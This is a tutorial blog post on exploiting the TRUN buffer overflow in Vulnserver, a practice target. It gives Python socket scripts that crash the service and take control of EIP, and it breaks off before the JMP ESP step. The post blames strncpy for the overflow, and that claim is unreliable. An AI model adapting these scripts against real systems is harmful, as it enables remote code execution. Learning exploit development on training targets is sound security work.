---
layout: single
title: Classic JMP ESP buffer overflow exploitation - remote overflow in Vulnserver
---

This post covers the beginning of any exploit developers journey, the classic buffer overflow exploitation. 

This post covers the exploitation of the Vulnererver TRUN command, utilizing a JMP ESP and EIP overwrite to obtain remote code execution on a system.

So what exactly is a buffer overflow vulnerability? A buffer overflow vulnerability is a software programming error that occurs commonly in C, and c++  applications when the software author uses insecure functions.  A buffer overflow vulnerability is where an input function is not validating the amount of user input that is given, which will allow a user to give too much the data that can then overwrite the buffer sized amount that is designated for the input, and start  writing data onto the stack.

The classic exploitation technique for a standard buffer overflow is to fill up the input buffer, and calculate exactly how much data you need to precisely place a JMP instruction within the EIP  memory register. The EIP memory register is responsible for pointing to the next address that is going to be executed, if the attacker can add a JMP instruction into this EIP register, they can have that JMP instruction point to a malicious payload, a malicious shellcode payload.

While auditing the source code for this application, you can see that the TRUN  command takes user input using the insecure strncpy function, this allows for an attacker to abuse the applications buffer overflow vulnerability.

```c
	} else if (strncmp(RecvBuf, "TRUN ", 5) == 0) {
		char *TrunBuf = malloc(3000);
		memset(TrunBuf, 0, 3000);
		for (i = 5; i < RecvBufLen; i++) {
			if ((char)RecvBuf[i] == '.') {
				strncpy(TrunBuf, RecvBuf, 3000); // <------------	
				Function3(TrunBuf);
				break;
			}
		}
```

Start running the vulnserver application, make sure your firewall is configured to allow this local connection. 

![vulnserver 1](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/vulnserver/vulnserver1.png)

First a basic nc connection to the victim machine on port 9999 shows that Vulnserver is actively running.

![vulnserver 2](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/vulnserver/vulnserver2.png)

Use Immunity debugger and attach the running vulnserver application to it, this will allow you to monitor and fully get a grasp on the application being exploited.

![vulnserver 3](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/vulnserver/vulnserver3.png)

With the vulnserver application running on port 9999 on the victim host target, you can use a basic python socket connection in order to send data to this command.

```python
import socket

victim_host = "10.0.0.161"
port = 9999

payload = "A" * 4000
buffer_exploit = "TRUN /.:/" + payload

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((victim_host, port))
expl.send(buffer_exploit)

print("[x] Sent TRUN + malicious payload to the victim")
print("[!] You may need to send it multiple times")
expl.close()
```
After you send the vulnerable application the buffer of A's, you can observe the application crashing. The overwritten registers show this is being successfully exploited.

![vulnserver 4](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/vulnserver/vulnserver4.png)

Now that we can confirm it is vulnerable to a classic EIP overwritten buffer overflow, we need to figure out exactly how big the buffer size is when we write data into the program, it crashes with 4000 bytes, but how big is the buffer? 

If we can determine how big the buffer is, we can fill it up, and the next data after it will be written into the EIP registers (4 bytes), which we need to control.

We can use the pattern_create tool from metasploit, this creates a unique pattern every few bytes, if we crash the program with this, we can see exactly where the EIP register has been overwritten.

```
└─▪ ./pattern_create.rb -l 4000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6.........
```

Send this unqiue string to the application instead of all A's

![vulnserver 5](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/vulnserver/vulnserver5.png)

Now you can see the EIP register has been overwritten with 386F4337, this is a section of the unique pattern we sent, you can use the mona.py Immunity debugger extension as set up in the previous post (https://fullpwnops.com/immunity-windbg-mona/) to calculate this buffer size.

Use the command `!mona findmsp` to have mona calculate exactly how much data it took to overwrite the EIP register.

![vulnserver 6](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/vulnserver/vulnserver6.png)

Now we know it took exactly 2003 bytes to fill up the input buffer, so if we send 2007 bytes, the 4 bytes after the buffer are going to overwrite the EIP register.

Add this to our exploit script.

```python
import socket

victim_host = "10.0.0.161"
port = 9999

payload = "A" * 2003
payload += "B" * 4

buffer_exploit = "TRUN /.:/" + payload

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((victim_host, port))
expl.send(buffer_exploit)

print("[x] Sent TRUN + malicious payload to the victim")
print("[!] You may need to send it multiple times")
expl.close()
```

Now when you re-send your exploit to the application, you can see the EIP register is now 42424242, which is our 4 B's send after our A's, we control the EIP register!

Now that we can control what address get's executed next, we want to find a JMP ESP instruction, which will allow us to jump to our payload.

Now 
